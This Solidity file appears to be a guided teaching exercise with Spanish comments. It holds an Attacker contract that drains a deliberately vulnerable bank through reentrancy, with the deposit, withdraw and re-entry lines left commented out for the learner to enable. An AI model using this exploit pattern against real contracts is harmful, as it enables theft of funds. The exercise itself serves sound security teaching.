// SPDX-License-Identifier: MIT
pragma solidity 0.8.38;

import {VulnerableBank} from "./VulnerableBank.sol";

// ¿Qué? El atacante de una reentrancy de una sola función: deposita, retira y, cada vez que
//   recibe ETH, vuelve a llamar a `withdraw` antes de que el banco ponga su saldo a cero.
// ¿Para qué? Ver con tus ojos cómo se vacía un banco que envía antes de anotar.
contract Attacker {
    VulnerableBank public immutable BANK;
    address public immutable OWNER;
    uint256 public stake;

    constructor(VulnerableBank bank) {
        BANK = bank;
        OWNER = msg.sender;
    }

    /// @notice Deposita lo que envías y retira: el resto lo hace `receive`.
    // PASO 1: depositar y retirar.
    // Borra la línea del revert y descomenta las líneas que empiezan con `//> `.
    function attack() external payable {
        revert("TODO: Paso 1");
        //> stake = msg.value;
        //> BANK.deposit{value: msg.value}();
        //> BANK.withdraw();
    }

    /// @notice Lleva el botín a quien desplegó el atacante.
    function collect() external {
        (bool ok,) = OWNER.call{value: address(this).balance}("");
        require(ok, "collect");
    }

    // PASO 2: volver a entrar mientras quede en el banco al menos lo depositado.
    // Descomenta la línea que empieza con `//> `. Sin ella, `receive` solo acepta el ETH.
    receive() external payable {
        //> if (address(BANK).balance >= stake) BANK.withdraw();
    }
}
